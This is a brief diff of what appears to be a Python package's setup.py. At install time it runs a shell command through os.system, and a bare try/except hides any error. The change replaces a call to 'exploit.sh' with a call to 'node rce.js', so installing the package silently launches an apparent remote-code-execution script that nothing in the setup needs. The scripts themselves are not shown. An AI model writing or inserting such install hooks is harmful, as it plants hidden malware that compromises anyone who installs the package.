@@ -1,7 +1,7 @@
 from setuptools import setup
 import os
 try:
-    os.system("bash exploit.sh")
+    os.system("node rce.js")
 except:
     pass
 setup(
